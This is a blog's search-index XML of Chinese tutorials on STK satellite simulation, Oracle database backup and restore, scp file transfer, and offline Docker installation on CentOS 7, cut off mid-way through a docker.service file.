<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>【Astronautics】STK 仿真推演之更新空间天气模型</title>
    <url>/p/46b6e3c8.html</url>
    <content><![CDATA[<h1 id="软件环境">1. 软件环境</h1>
<table>
<thead>
<tr class="header">
<th>序号</th>
<th>名称</th>
<th>备注</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td> 1</td>
<td> 操作系统</td>
<td> Windows 11 预览版</td>
</tr>
<tr class="even">
<td> 2</td>
<td>STK</td>
<td>11.6 版本</td>
</tr>
</tbody>
</table>
<h1 id="手动更新空间天气模型">2. 手动更新空间天气模型</h1>
<ol type="1">
<li><p>访问 celestrak 网站，下载最近五年或者是自 1957 年起始的空间天气模型文件。
</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">https://celestrak.com/SpaceData/</span><br></pre></td></tr></tbody></table></figure> <img src="/p/46b6e3c8/空间天气模型数据下载.webp" alt="空间天气模型数据下载"><p></p></li>
<li><p>以文本文档的形式打开该文件，可看到文件头部的文件名、版本、更新日期等信息，拉到文件最后，可看到数据已更新至 2032 年 1 月 1 日 (数据查看日期：2021 年 8 月 21 日 8 点，实际请以最新为准)。
<img src="/p/46b6e3c8/空间天气模型更新时间.webp" alt="空间天气模型更新时间"> <img src="/p/46b6e3c8/空间天气模型最新数据日期.webp" alt="空间天气模型最新数据日期"></p></li>
<li><p>将文件放置在 <code>C:\ProgramData\AGI\STK 11(64)\DynamicEarthData</code> 路径下，即可完成更新。</p></li>
</ol>
<h1 id="自动更新空间天气模型">4. 自动更新空间天气模型</h1>
<ol type="1">
<li><p>如果 STK 安装在可联网的电脑上，则可通过 STK 自带的数据更新工具，自动更新空间天气模型以及其它数据。</p></li>
<li><p>打开 STK 后，在菜单栏中点击 <code>Utilities</code>-<code>Data Update</code>，进入数据更新页面。</p>
<figure>
<img src="/p/46b6e3c8/image-20241230164110385.png" alt="image-20241230164110385">
<figcaption aria-hidden="true">image-20241230164110385</figcaption>
</figure></li>
<li><p> 勾选需要的数据项后，点击 <code>Update Now</code> 即可，期间建议不要操作 STK 软件，否则容易卡住导致 STK 崩溃退出。</p>
<figure>
<img src="/p/46b6e3c8/image-20241230164234095.png" alt="image-20241230164234095">
<figcaption aria-hidden="true">image-20241230164234095</figcaption>
</figure></li>
</ol>
<h1 id="使用空间天气模型">3. 使用空间天气模型</h1>
<ol type="1">
<li><p>打开 STK 软件，新建一个场景，并已默认的形式插入一颗卫星。 <img src="/p/46b6e3c8/新建一颗默认卫星.webp" alt="插入一颗默认卫星"></p></li>
<li><p>在左侧对象浏览器中，双击卫星名称，进入其属性页面。</p></li>
<li><p>修改 Orbit 页面中的 <code>Propagator</code> 属性为 <code>HPOP</code>，即选用高精度轨道外推模型，其涵盖了众多复杂的轨道摄动模型，如联合重力模型（JGM）、日月引力模型、大气密度阻力模型以及太阳光压模型等。</p></li>
<li><p>修改 Coord System 为 <code>J2000</code> 坐标系。 <img src="/p/46b6e3c8/轨道外推模型和坐标系选择.webp" alt="轨道外推模型和坐标系选择"></p></li>
<li><p>点击 <code>Force Models</code> 按钮，在 <code>Gravity页签</code>的 Central
Body Gravity 部分，修改重力场模型为 <code>EGM2008.grv</code>。 <img src="/p/46b6e3c8/修改重力场模型.webp" alt="修改重力场模型"></p></li>
<li><p>切换到 <code>Drag</code> 页签，根据需要修改大气阻尼系数 CD 值，<code>Atmospheric Density</code> 修改为 <code>NRLMSISE 2000</code>（STK
11.2 版本以下显示为 <code>Atm.Density Model</code>）。 <img src="/p/46b6e3c8/修改大气阻力模型.webp" alt="修改大气阻力模型"></p></li>
<li><p>在下方的 Solar
Flux/GeoMag 部分，修改为 <code>Use File</code>，Flux/Ap
File 选择为之前已更新好的模型文件即可。 <img src="/p/46b6e3c8/选择最新的空间天气模型.webp" alt="选择最新的空间天气模型"></p></li>
<li><p>最后，基于以上步骤对卫星模型的配置和修改，在后续的卫星可见性计算、星历计算及轨道外推计算等场景时，将能有效提高数据精确度。</p></li>
</ol>
]]></content>
      <categories>
        <category>Astronautics</category>
      </categories>
      <tags>
        <tag>Astronautics</tag>
        <tag>STK</tag>
        <tag>大气阻力</tag>
        <tag>空间天气模型</tag>
      </tags>
  </entry>
  <entry>
    <title>【Astronautics】基于 STK 软件仿真计算星间距离</title>
    <url>/p/97ec9341.html</url>
    <content><![CDATA[<h1 id="参数准备">1. 参数准备</h1>
<table>
<colgroup>
<col style="width: 6%">
<col style="width: 30%">
<col style="width: 46%">
<col style="width: 17%">
</colgroup>
<thead>
<tr class="header">
<th>序号</th>
<th>参数</th>
<th>卫星 A</th>
<th> 卫星 B</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>1</td>
<td>EpochTime</td>
<td>10 Sep 2021 04:00:00.000 UTCG</td>
<td> 同卫星 A</td>
</tr>
<tr class="even">
<td>2</td>
<td>Semi-major Axis</td>
<td>7000.000 km</td>
<td>7010.000 km</td>
</tr>
<tr class="odd">
<td>3</td>
<td>Eccentiricity</td>
<td>0.000</td>
<td>0.000</td>
</tr>
<tr class="even">
<td>4</td>
<td>Inclination</td>
<td>97.500 deg</td>
<td>97.500 deg</td>
</tr>
<tr class="odd">
<td>5</td>
<td>Argument of Perigee</td>
<td>0.000 deg</td>
<td>0.000 deg</td>
</tr>
<tr class="even">
<td>6</td>
<td>RAAN</td>
<td>245.000 deg</td>
<td>245.000 deg</td>
</tr>
<tr class="odd">
<td>7</td>
<td>Mean Anomaly</td>
<td>233.000 deg</td>
<td>233.200 deg</td>
</tr>
</tbody>
</table>
<h1 id="操作步骤">2. 操作步骤</h1>
<ol type="1">
<li><p>打开 STK，新建一个仿真场景，根据以上轨道根数，建立两个卫星对象。
<img src="/p/97ec9341/场景设置.webp" alt="场景设置"> <img src="/p/97ec9341/SateA轨道设置.webp" alt="SateA轨道设置"> <img src="/p/97ec9341/SateB轨道设置.webp" alt="SateB轨道设置"></p></li>
<li><p>点击 <code>Analysis</code> -&gt;
<code>Access</code> 菜单，进入计算页面。 <img src="/p/97ec9341/Access计算页面.webp" alt="Access计算页面"></p></li>
<li><p>点击 <code>Select Object</code> 按钮，选择 A 星作为基准星，在下方选择 B 星作为目标星。</p></li>
<li><p>在 Access 界面右侧的 Graphs 下方点击 <code>AER</code> 按钮，以图形报告的形式展示指定时间范围内的 <code>Azimuth</code>、<code>Elevation</code> 和 <code>Range</code> 数据的变化趋势，其中 <code>Azimuth</code>、<code>Elevation</code> 和 <code>Range</code> 分别是<code>方位角</code>、<code>高度角</code>和<code>直线距离</code>。
<img src="/p/97ec9341/AER图形报告.webp" alt="AER图形报告"></p></li>
<li><p>在 Access 界面右侧的 Reports 下方点击 <code>AER</code> 按钮，以文本报告的形式展示指定时间范围内每个时刻的 <code>Azimuth</code>、<code>Elevation</code> 和 <code>Range</code> 数据。
<img src="/p/97ec9341/AER文本报告.webp" alt="AER文本报告"></p></li>
<li><p>点击 <code>3D Graphics Displays</code> 按钮，在弹出的 3D 图形数据展示窗口中添加一个 <code>AER</code> 数据类型，个性化设置显示字体颜色及位置后保存，即可在 3D 地球页面实时展示双星之间的 <code>Azimuth</code>、<code>Elevation</code> 和 <code>Range</code> 等信息。
<img src="/p/97ec9341/3D图形展示AER数据设置.webp" alt="3D图形展示AER数据设置"> <img src="/p/97ec9341/3D图形页面实时展示AER数据.webp" alt="3D图形页面实时展示AER数据"></p></li>
</ol>
]]></content>
      <categories>
        <category>Astronautics</category>
      </categories>
      <tags>
        <tag>Astronautics</tag>
        <tag>STK</tag>
        <tag>卫星仿真</tag>
      </tags>
  </entry>
  <entry>
    <title>【Astronautics】基于 STK 软件矢量工具之计算和展示两个矢量之间的夹角</title>
    <url>/p/ea535da4.html</url>
    <content><![CDATA[<h1 id="环境说明">1. 环境说明</h1>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">序号</th>
<th style="text-align: center;">名称</th>
<th style="text-align: center;">说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"> 1</td>
<td style="text-align: center;">windows 系统</td>
<td style="text-align: center;"> 11</td>
</tr>
<tr class="even">
<td style="text-align: center;">2</td>
<td style="text-align: center;">STK 软件</td>
<td style="text-align: center;"> V11.6</td>
</tr>
</tbody>
</table>
<span id="more"></span>
<hr>
<h1 id="矢量工具简介">2. 矢量工具简介</h1>
<p>  STK 软件中的矢量工具包含大量的矢量类型以及相关的组件，这些矢量类型能够添加到对象中，并在 3D 视图中展示出来，常用的矢量类型包含向量、坐标轴、点、坐标系、角、平面等。
  通过菜单栏 <code>Analysis</code>-&gt;<code>Analysis Workbench</code> 菜单，即可访问矢量工具页面，在 <code>Vector Geometry</code> 标签中，左侧点击选中不同类型的对象，右侧则展示该对象类型的组件列表，包含向量、坐标系、点、平面等，页面中部可新建不同类型的矢量，页面中部上方则可对矢量进行修改、过滤展示、删除、导入、导出等操作。
<img src="/p/ea535da4/AnalysisWorkbench主页面.webp" alt="Analysis Workbench主页面"></p>
<hr>
<h1 id="操作步骤">3. 操作步骤</h1>
<h2 id="场景初始化">3.1. 场景初始化</h2>
<ol type="1">
<li>打开 STK 软件，新建一个场景。 <img src="/p/ea535da4/新建场景.webp" alt="新建场景"></li>
<li>插入一颗卫星，可直接从 STK 卫星数据库中插入，或从 <a href="https://celestrak.com/">celestrack</a> 网站中获取 TLE 两行码导入。
<img src="/p/ea535da4/STK数据库中插入卫星.webp" alt="STK数据库中插入卫星"></li>
<li>插入一个地面站，可直接从 STK 地面站数据库中插入。 <img src="/p/ea535da4/STK数据库中插入地面站.webp" alt="STK数据库中插入地面站"></li>
</ol>
<h2 id="默认矢量组件展示">3.2. 默认矢量组件展示</h2>
<p>  以卫星对象为例，软件自带的默认矢量类型及组件包含如下。 &gt;
其他对象自带的矢量类型，可自行探索。</p>
<table>
<colgroup>
<col style="width: 11%">
<col style="width: 88%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">矢量类型</th>
<th style="text-align: left;">矢量名称</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"> Angles</td>
<td style="text-align: left;">SunMoon Angle</td>
</tr>
<tr class="even">
<td style="text-align: center;">Axes</td>
<td style="text-align: left;">Body Axes、TopoCentric Axes、VVLH
Axes、J2000 Axes</td>
</tr>
<tr class="odd">
<td style="text-align: center;">Vectors</td>
<td style="text-align: left;">Sun Vector、Moon Vector、Nadir(Centric)
Vector、Velocity Vector</td>
</tr>
<tr class="even">
<td style="text-align: center;">Planes</td>
<td style="text-align: left;">Body.XY Plane</td>
</tr>
</tbody>
</table>
<h3 id="角度angles">3.2.1. 角度（Angles）</h3>
<ol type="1">
<li>SunMoon
Angle：日月夹角，以卫星为顶点，顶点分别指向太阳和月球的两条向量形成的角度。
<img src="/p/ea535da4/SunMoonAngle.webp" alt="SunMoon Angle"></li>
</ol>
<h3 id="坐标系axes">3.2.2. 坐标系（Axes）</h3>
<ol type="1">
<li>Body
Axes：本体坐标系，以卫星质心为原点，飞行方向为 OX 轴，卫星指向地心的负法向为 OZ 轴，OY 轴由右手螺旋定则确定。
<img src="/p/ea535da4/BodyAxes.webp" alt="Body Axes"></li>
<li>TopoCentric
Axes：站心坐标系，以卫星质心为原点，飞行方向为 OX 轴，卫星指向地心的法向为 OZ 轴，OY 轴根据右手螺旋定则确定。
<img src="/p/ea535da4/TopoCentricAxes.webp" alt="TopoCentric Axes"></li>
<li>VVLH
Axes：英文全称是 <code>Vehicle Velocity Local Horizontal coordinate system</code>，以卫星本体质心为坐标系原点，OX 轴沿飞行方向，OY 轴指向基于地惯系的轨道平面的负法向，OZ 轴指向地心方向。
<img src="/p/ea535da4/VVLHAxes.webp" alt="VVLH Axes"></li>
<li>J2000 Axes：即 J2000 惯性坐标系，典型的地心惯性坐标系（Earth-Centered
Inertial coordinate system），坐标原点为地球质心，选用 2000 年 1 月 1 日 UTC
12:00 为标准历元的经过该瞬时的岁差和章动改正后的北天极和春分点分别确定 Z 轴和 X 轴，Y 轴可由右手螺旋定则确定。
<img src="/p/ea535da4/J2000Axes.webp" alt="J2000 Axes"></li>
</ol>
<h3 id="向量vector">3.2.3. 向量（Vector）</h3>
<ol type="1">
<li>Sun Vector：太阳向量，以卫星为顶点，指向太阳的向量。 <img src="/p/ea535da4/SunVector.webp" alt="Sun Vector"></li>
<li>Moon Vector：月球向量，以卫星为顶点，指向月球的向量。 <img src="/p/ea535da4/MoonVector.webp" alt="Moon Vector"></li>
<li>Nadir (Centric)
Vector：中心天底向量，以卫星为顶点，指向地球地心的向量。 <img src="/p/ea535da4/Nadir(Centric)Vector.webp" alt="Nadir(Centric) Vector"></li>
<li>Velocity
Vector：速度向量，即卫星的飞行速度向量，仅当卫星轨道为正圆轨道时，飞行速度矢量与本体坐标系中的 OX 轴重合。
<img src="/p/ea535da4/VelocityVector.webp" alt="Velocity Vector"></li>
</ol>
<h3 id="平面plane">3.2.4. 平面（Plane）</h3>
<ol type="1">
<li>Body.XY
Plane：本体 XY 平面，顾名思义，以卫星本体坐标系的 X、Y 轴所形成的的平面，其中 + X 轴指向飞行方向，+Y 轴在卫星纵对称面内垂直于 X 轴，沿飞行方向指向右。
<img src="/p/ea535da4/Body.XYPlane.webp" alt="Body.XY Plane"></li>
</ol>
<h2 id="自定义矢量展示">3.3. 自定义矢量展示</h2>
<p>  自定义矢量的方式有两个，一种是通过菜单栏 <code>Analysis</code>-&gt;<code>Analysis Workbench</code> 菜单，通过在左侧选择不同对象，然后点击中部的不同矢量类型的图标按钮，即可新建一个所选对象的矢量；另一种方式则是在主页面左侧对象浏览器中，双击一个对象进入其属性页面，往下选择 <code>Vector</code> 属性，即可对所选对象进行新增不同类型的矢量。
&gt;
由于本部分内容未涉及自定义矢量的删除和导入导出操作，同时为了方便内容阐述及页面操作，以下矢量的新建及展示，均通过第二种方式进行。</p>
<h3 id="向量vectors">3.3.1. 向量（Vectors）</h3>
<p>  向量矢量，通过设置原始点和目标点，由原始点指向目标点所形成的射线，即为所选对象的向量矢量。
1.
在卫星的 <code>Vector</code> 属性页面，切换至 <code>Vectors</code> 标签页，点击 <code>Add</code> 按钮，在弹出的 <code>Add Components</code> 页面中，再点击中部的向量图标按钮，弹出向量组件添加对话框，展示如下。
<img src="/p/ea535da4/向量矢量设置页面.webp" alt="向量矢量设置页面"> 2.
按照如下设置，可新建一个卫星中心点指向北京地面站中心点的矢量，3D 视图中展示效果如下。
</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">Name:</span> <span class="string">SateToFac_Vector</span></span><br><span class="line"><span class="attr">Origin Point:</span> <span class="string">Satellite2</span> <span class="string">Center</span></span><br><span class="line"><span class="attr">Destination Point:</span> <span class="string">Beijing_Station</span> <span class="string">Center</span></span><br></pre></td></tr></tbody></table></figure> <img src="/p/ea535da4/卫星_地面站向量矢量展示效果.webp" alt="卫星-地面站向量矢量展示效果"> 3.
再按照如下设置，新建一个卫星中心指向太阳中心点的矢量，3D视图中展示效果如下。
<figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">Name:</span> <span class="string">SateToSun_Vector</span></span><br><span class="line"><span class="attr">Origin Point:</span> <span class="string">Satellite2</span> <span class="string">Center</span></span><br><span class="line"><span class="attr">Destination Point:</span> <span class="string">Sun</span> <span class="string">Center</span></span><br></pre></td></tr></tbody></table></figure> <img src="/p/ea535da4/卫星_太阳向量矢量展示效果.webp" alt="卫星-太阳向量矢量展示效果"> 4.
自此，咱们已经在场景中基于Satellite1卫星自定义了两个矢量向量，由卫星中心点分别指向太阳中心点和地面站中心点。<p></p>
<h3 id="角度angles-1">3.3.2. 角度（Angles）</h3>
<p>  假设现在想要计算和查看由上述两条矢量向量组成的矢量夹角，其操作步骤说明如下。
1.
在卫星的 <code>Vector</code> 属性页面，切换至 <code>Vectors</code> 标签页，点击 <code>Add</code> 按钮，再点击页面中部的角度图标按钮，弹出的对话框展示如下。
<img src="/p/ea535da4/角度矢量设置页面.webp" alt="角度矢量设置页面"> 2.
按照如下设置，选择上述新增的两条向量矢量，再为矢量夹角自定义名称，点击 <code>Apply</code> 按钮，即可在 3D 视图中展示，效果如下，若要实时展示角度值，只需在角度矢量列表选中角度矢量后，勾选右侧的 <code>Show angle value</code> 选项即可。
</p><figure class="highlight yml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">Name:</span> <span class="string">Sun_Sate_Fac_Angle</span></span><br><span class="line"><span class="attr">From Vector:</span> <span class="string">Satellite2</span> <span class="string">SateToSun_Vector</span></span><br><span class="line"><span class="attr">To Vector:</span> <span class="string">Satellite2</span> <span class="string">SateToFac_Vector</span></span><br></pre></td></tr></tbody></table></figure> <img src="/p/ea535da4/太阳_卫星_地面站矢量夹角展示效果.webp" alt="太阳_卫星_地面站矢量夹角展示效果"> 3.
通过新建一个 <code>3D Attitude Graphics Window</code> 页面，可避免星空背景、地球等其他对象的显示干扰，沉浸式的观察太阳_卫星_地面站矢量夹角变化情况。
<img src="/p/ea535da4/New%203D%20Attitude%20Graphics%20Window.webp" alt="3D Attitude Graphics Window"> <img src="/p/ea535da4/太阳_卫星_地面站矢量夹角动画效果.gif" alt="太阳_卫星_地面站矢量夹角动画效果"> 4.
如果要将上述创建的矢量夹角导出为文本/图形报告时，则可以通过 <code>Analysis</code>-&gt;<code>Report &amp; Graph Manager</code> 菜单，进入报告管理页面，自定义一个文本/图形报告，报告的字段格式选择 <code>Angle</code> 节点下的 <code>Sun_Sate_Fac_Angle</code>（因个人自定义名称而不同），最后再进行生成报告。
<img src="/p/ea535da4/报告管理页面.webp" alt="报告管理页面"> <img src="/p/ea535da4/自定义报告格式.webp" alt="自定义报告格式"> 5.
针对<code>太阳_卫星_地面站矢量夹角</code>与<code>时间</code>的关系及变化趋势，生成的文本报告和图形报告展示如下。
<img src="/p/ea535da4/文本报告.webp" alt="文本报告"> <img src="/p/ea535da4/图形报告.webp" alt="图形报告"><p></p>
]]></content>
      <categories>
        <category>Astronautics</category>
      </categories>
      <tags>
        <tag>Astronautics</tag>
        <tag>STK</tag>
        <tag>卫星仿真</tag>
        <tag>STK矢量工具</tag>
      </tags>
  </entry>
  <entry>
    <title>【Database】Oracle 数据库的备份与还原</title>
    <url>/p/bc374837.html</url>
    <content><![CDATA[<h1 id="数据库备份">1. 数据库备份</h1>
<ol type="1">
<li><p>利用 <code>PL/SQL Server</code> 软件，使用待备份的数据库用户连接数据库，执行如下命令，创建并指定一个导出文件夹（文件夹路径根据 Oracle 安装所在系统类型进行设置）。
</p><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace directory expfile <span class="keyword">as</span> <span class="string">'D:\export'</span>;</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>远程登录到 Oracle 数据库安装所在的服务器上，打开 cmd 终端或 bash 终端，按照如下命令格式执行命令，即可备份数据库文件至第 1 步中指定的文件夹下。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">expdp username/password@dbname directory=expfile dumpfile=<span class="string">'20210822_bak.dmp'</span></span><br><span class="line"><span class="comment"># username: 数据库用户名</span></span><br><span class="line"><span class="comment"># password: 数据库口令</span></span><br><span class="line"><span class="comment"># dbname: 待备份的数据库实例名</span></span><br><span class="line"><span class="comment"># directory: 导出的文件夹别名，需与第一步中指定的名字保持一致</span></span><br><span class="line"><span class="comment"># dumpfile: 数据库导出后保存的文件名称，自定义</span></span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ol>
<hr>
<h1 id="数据库迁移恢复">2. 数据库迁移恢复</h1>
<ol type="1">
<li><p>与数据库备份类似，利用 <code>PL/SQL Server</code> 软件，使用数据库管理员身份（sysdba）登录数据库服务器，执行如下命令，手动创建一个新的数据库表空间和用户名（如果是还原已有的数据库实例，则可略过此步骤）。
</p><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建表空间-- 创建表空间</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span>space new_tablespace_name    <span class="comment">-- 名字自定义</span></span><br><span class="line">logging</span><br><span class="line">datafile <span class="string">'D:\app\boyce\oradata\orcl\new_tablespace_name.dbf'</span>   <span class="comment">-- 根据Oracle数据库所在服务器的系统类型进行修改</span></span><br><span class="line">size <span class="number">50</span>m</span><br><span class="line">autoextend <span class="keyword">on</span></span><br><span class="line">next <span class="number">50</span>m maxsize <span class="number">20480</span>m</span><br><span class="line">extent management <span class="keyword">local</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 创建用户，并赋予临时表空间和默认表空间</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> username identified <span class="keyword">by</span> password</span><br><span class="line"><span class="keyword">default</span> tablespace new_tablespace_name   <span class="comment">-- 与第一行保持一致</span></span><br><span class="line">temporary tablespace TEMP;           <span class="comment">-- 保持默认即可</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 给用户授权</span></span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">connect</span>, resource, dba <span class="keyword">to</span> username;</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>利用 <code>PL/SQL Server</code> 软件，使用第 1 步创建的新用户名和密码（或已有数据库实例对应的用户名和密码）登录数据库执行如下命令，创建并指定一个导入文件夹（文件夹路径根据 Oracle 安装所在系统类型进行设置）。
</p><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">or</span> replace directory impfile <span class="keyword">as</span> <span class="string">'D:\import'</span>;</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>最后，将待恢复的数据库文件拷贝至 <code>D:\import</code> 路径下后，打开 cmd 终端或 bash 终端，按照如下命令格式执行命令，即可将指定的数据库文件恢复至指定的数据库实例中。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">impdp username/password@dbname directory=impfile dumpfile=<span class="string">'20210822_bak.dmp'</span> REMAP_SCHEMA=old_username:new_username REMAP_TABLESPACE=old_spacetable:new_tablespace_name</span><br><span class="line"><span class="comment"># username: 数据库用户名</span></span><br><span class="line"><span class="comment"># password: 数据库口令</span></span><br><span class="line"><span class="comment"># dbname: 待恢复的数据库实例名</span></span><br><span class="line"><span class="comment"># directory: 导入的文件夹别名，需与第2步中指定的名字保持一致</span></span><br><span class="line"><span class="comment"># dumpfile: 待恢复的数据库文件名，需与文件夹下的文件名保持一致</span></span><br><span class="line"><span class="comment"># REMAP_SCHEMA: 如果原用户名与新用户名不同，则加入此部分，否则忽略</span></span><br><span class="line"><span class="comment"># REMAP_TABLESPACE: 如果原数据库表空间名与新数据库表空间名不同，则加入此部分，否则忽略</span></span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ol>
]]></content>
      <categories>
        <category>Database</category>
      </categories>
      <tags>
        <tag>Database</tag>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】在 windows 上使用 scp 命令，获取 Linux 服务器中的指定文件</title>
    <url>/p/3e5b8bb5.html</url>
    <content><![CDATA[<h1 id="前言">1. 前言</h1>
<p>  在最新的 Windows 10
系统中，已经默认集成了 ssh、scp 客户端等软件。相比于之前的 Windows
7 时代，在 window 上想连接或获取 Linux 服务器文件，简单省事了许多，再也无需另外安装 ssh 客户端和 putty 软件了。</p>
<span id="more"></span>
<hr>
<h1 id="实现步骤">2. 实现步骤</h1>
<ol type="1">
<li>当前的 Windows 10 的部分系统信息如下。 <figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">C:\Users\boyce&gt;systeminfo</span><br><span class="line">主机名:           BOYCE-DESKTOP</span><br><span class="line">OS 名称:          Microsoft Windows 10 专业版</span><br><span class="line">OS 版本:          10.0.19042 暂缺 Build 19042</span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          独立工作站</span><br><span class="line">OS 构建类型:      Multiprocessor Free</span><br></pre></td></tr></tbody></table></figure></li>
<li>通过 <code>where</code> 命令，可以确认下系统中是否已有 scp 程序。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 查看scp程序所在位置</span></span><br><span class="line">C:\Users\boyce&gt;<span class="built_in">where</span> scp</span><br><span class="line">C:\Windows\System32\OpenSSH\scp.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出OpenSSH目录下集成的程序</span></span><br><span class="line">C:\Users\boyce&gt;<span class="built_in">dir</span> C:\Windows\System32\OpenSSH</span><br><span class="line"> 驱动器 C 中的卷是 Windows</span><br><span class="line"> 卷的序列号是 FECF-1AB9</span><br><span class="line"></span><br><span class="line"> C:\Windows\System32\OpenSSH 的目录</span><br><span class="line"></span><br><span class="line">2019/12/07  22:44    &lt;DIR&gt;          .</span><br><span class="line">2019/12/07  22:44    &lt;DIR&gt;          ..</span><br><span class="line">2019/10/15  21:50           322,560 scp.exe</span><br><span class="line">2019/10/15  21:50           390,144 sftp.exe</span><br><span class="line">2019/10/15  21:50           491,520 ssh-add.exe</span><br><span class="line">2019/10/15  21:50           384,512 ssh-agent.exe</span><br><span class="line">2019/10/15  21:50           637,952 ssh-keygen.exe</span><br><span class="line">2019/10/15  21:50           530,432 ssh-keyscan.exe</span><br><span class="line">2019/10/15  21:50           882,688 ssh.exe</span><br><span class="line">               7 个文件      3,639,808 字节</span><br><span class="line">               2 个目录 169,993,207,808 可用字节</span><br></pre></td></tr></tbody></table></figure></li>
<li>按照如下格式，即可获取 Linux 服务器上的指定文件，保存在 Windows 的指定目录下。
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># 格式, 当获取的是文件夹时,需要添加 -r 参数</span></span><br><span class="line">scp [-r] username@linux_ip source_path target_path</span><br><span class="line"></span><br><span class="line"><span class="comment"># 拷贝Linux中的20210328.img文件至E盘中</span></span><br><span class="line">scp boyce@10.10.10.145:/home/boyce/app/rpi-backup/20210328.img <span class="string">"E:\07SYS_Files"</span></span><br><span class="line">boyce@10.10.10.145<span class="string">'s password:</span></span><br><span class="line"><span class="string">20210328.img                                   3%  662MB  44.8MB/s   07:01 ETA</span></span><br></pre></td></tr></tbody></table></figure></li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>SCP</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】基于 CentOS 7 系统离线安装 docker 并更新至最新版</title>
    <url>/p/28064c7.html</url>
    <content><![CDATA[<h1 id="背景">1. 背景</h1>
<p>  在某些只允许离线办公的内网环境中，如果想要在 Linux 系统中安装所需要的软件，是无法通过 <code>apt</code> 或 <code>yum</code> 命令直接下载安装的。所以在这种场景下，就只能通过将需要的软件包及其依赖包在外网下载好之后，以离线的方式进行安装。</p>
<hr>
<h1 id="环境信息">2. 环境信息</h1>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">序号</th>
<th style="text-align: center;">名称</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"> 1</td>
<td style="text-align: center;"> 系统版本</td>
<td> CentOS Linux release 7.9.2009 (Core)</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="安装步骤">3. 安装步骤</h1>
<h2 id="下载docker软件和依赖包">3.1. 下载 docker 软件和依赖包</h2>
<ol type="1">
<li><p>在相同的系统版本和 CPU 架构及位数的<strong>可联网</strong>的 Linux 系统上，执行如下命令，下载 docker 软件包和依赖包至指定路径。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">yum install --downloadonly --downloaddir=/root/package docker</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>进入下载路径查看下载的软件包列表。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/package/</span><br><span class="line"><span class="built_in">ls</span> -lh</span><br></pre></td></tr></tbody></table></figure> <img src="/p/28064c7/下载依赖包.webp" alt="下载依赖包"><p></p></li>
</ol>
<h2 id="上传并安装依赖包">3.2. 上传并安装依赖包</h2>
<ol type="1">
<li><p>使用 root 用户连接 Linux 系统，上传上一步下载的软件包和依赖包，并进入所在目录，执行如下命令，一次性安装所有的依赖包。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/package/</span><br><span class="line">rpm -Uvh *.rpm</span><br></pre></td></tr></tbody></table></figure> <img src="/p/28064c7/安装依赖包.webp" alt="安装依赖包"><p></p></li>
<li><p>执行如下命令，新建一个 <code>docker.service</code> 文件，用于启动 docker 服务。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">touch</span> /etc/systemd/system/docker.service</span><br><span class="line">vi /etc/systemd/system/docker.service</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>文件内容填写如下，注意第 12 行的 IP 地址，修改为 Linux 服务器的地址。
</p><figure class="highlight properties"><table><tbody><tr><td class="code"><pre><span class="line"><span class="attr">[Unit]</span></span><br><span class="line"><span class="attr">Description</span>=<span class="string">Docker Application Container Engine</span></span><br><span class="line"><span class="attr">Documentation</span>=<span class="string">https://docs.docker.com</span></span><br><span class="line"><span class="attr">After</span>=<span class="string">network-online.target firewalld.service</span></span><br><span class="line"><span class="attr">Wants</span>=<span class="string">network-online.target</span></span><br><span class="line"></span><br><span class="line"><span class="attr">[Service]</span></span><br><span class="line"><span class="attr">Type</span>=<span class="string">notify</span></span><br><span class="line"><span class="comment"># for containers run by docker</span></span><br><span class="line"><span class="attr">ExecStart</span>=<span class="string">/usr/bin/dockerd --selinux-enabled=false --insecure-registry=192.168.56.137</span></span><br><span class="line"><span class="attr">ExecReload</span>=<span class="string">/bin/kill 